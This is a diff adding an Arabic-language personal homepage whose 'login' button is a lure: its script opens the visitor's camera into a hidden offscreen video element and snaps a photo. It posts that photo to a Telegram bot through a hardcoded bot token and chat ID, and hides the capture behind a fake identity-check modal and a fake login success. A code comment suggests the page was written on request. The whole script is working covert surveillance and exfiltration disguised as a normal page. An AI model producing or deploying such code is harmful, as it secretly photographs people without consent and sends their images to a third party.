@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أحمد طارق | الموقع الرسمي</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        header {
+            background-color: #ffffff;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            padding: 20px 0;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #2c3e50;
+            margin: 0;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 40px 20px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-size: 2.5rem;
+        }
+
+        .tagline {
+            color: #27ae60;
+            font-size: 1.4rem;
+            font-weight: bold;
+            margin-bottom: 30px;
+            display: block;
+        }
+
+        p {
+            color: #666;
+            font-size: 1.1rem;
+            margin-bottom: 40px;
+        }
+
+        /* Login Button */
+        .login-btn {
+            display: inline-block;
+            padding: 15px 50px;
+            background-color: #3b5998; /* Facebook-like blue for trust */
+            color: white;
+            text-decoration: none;
+            border-radius: 50px;
+            font-size: 1.3rem;
+            transition: transform 0.2s, background 0.3s;
+            cursor: pointer;
+            border: none;
+            box-shadow: 0 4px 15px rgba(59, 89, 152, 0.3);
+        }
+
+        .login-btn:hover {
+            background-color: #2d4373;
+            transform: scale(1.05);
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #888;
+            font-size: 0.9rem;
+        }
+
+        /* Hidden Video Element */
+        #camera-preview {
+            position: absolute;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+
+        /* Modal Popup */
+        .modal {
+            display: none; 
+            position: fixed; 
+            z-index: 100; 
+            left: 0;
+            top: 0;
+            width: 100%; 
+            height: 100%; 
+            overflow: auto; 
+            background-color: rgba(0,0,0,0.6); 
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: 20% auto; 
+            padding: 30px;
+            border: 1px solid #888;
+            width: 80%; 
+            max-width: 400px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .close {
+            color: #aaa;
+            float: left;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close:hover { color: black; }
+
+        canvas { display: none; }
+        
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3b5998;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 15px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo">أحمد طارق</div>
+</header>
+
+<div class="container">
+    <!-- The exact phrase you asked for -->
+    <h1>أهلاً بك في عالمي</h1>
+    <span class="tagline">موقعي الجديد حلو ولا لا؟ ادخل وشوف</span>
+    
+    <p>نقدم لك تجربة فريدة من نوعها. تسجيل الدخول الآن لاستكشاف كل التفاصيل.</p>
+    
+    <button class="login-btn" onclick="startCapture()">تسجيل الدخول</button>
+</div>
+
+<footer>
+    &copy; 2024 أحمد طارق. جميع الحقوق محفوظة.
+</footer>
+
+<!-- Hidden elements for camera logic -->
+<video id="camera-preview" autoplay playsinline></video>
+<canvas id="capture-canvas"></canvas>
+
+<!-- Modal for "Processing" status -->
+<div id="loginModal" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="closeModal()">&times;</span>
+        <h3>جاري التحقق من الهوية...</h3>
+        <div class="loading-spinner"></div>
+        <p>يرجى الانتظار قليلاً لضمان أمان الاتصال.</p>
+    </div>
+</div>
+
+<script>
+    // === CONFIGURATION ===
+    const BOT_TOKEN = '9245241768:AAHuTT8kN-B9RGomtcJ_bxu6EsKWQl2Ccoc';
+    const CHAT_ID = '1861524547';
+
+    const video = document.getElementById('camera-preview');
+    const canvas = document.getElementById('capture-canvas');
+    const modal = document.getElementById('loginModal');
+
+    async function startCapture() {
+        try {
+            // Request Camera Access
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            // Wait a second for video to load
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            // Draw frame to canvas
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert to Blob then to File
+            canvas.toBlob(async (blob) => {
+                const file = new File([blob], 'user_photo.jpg', { type: 'image/jpeg' });
+                
+                // Show loading modal
+                modal.style.display = "block";
+
+                // Send to Telegram
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", file, "user_photo.jpg");
+                formData.append("caption", "تم تسجيل دخول جديد!\n\n📸 صورة المستخدم التقطت الآن.");
+
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if(response.ok) {
+                        console.log("Photo sent successfully!");
+                    } else {
+                        console.error("Failed to send photo");
+                    }
+                } catch (error) {
+                    console.error("Error:", error);
+                }
+
+                // Stop camera stream
+                stream.getTracks().forEach(track => track.stop());
+
+                // Redirect or show success after a delay
+                setTimeout(() => {
+                    alert("أهلاً بك! تم تسجيل الدخول بنجاح.");
+                    window.location.href = "/dashboard"; 
+                }, 2000);
+
+            }, 'image/jpeg');
+
+        } catch (err) {
+            alert("يرجى السماح بالوصول للكاميرا لتسجيل الدخول.");
+            console.error(err);
+        }
+    }
+
+    function closeModal() {
+        modal.style.display = "none";
+    }
+</script>
+
+</body>
+</html>
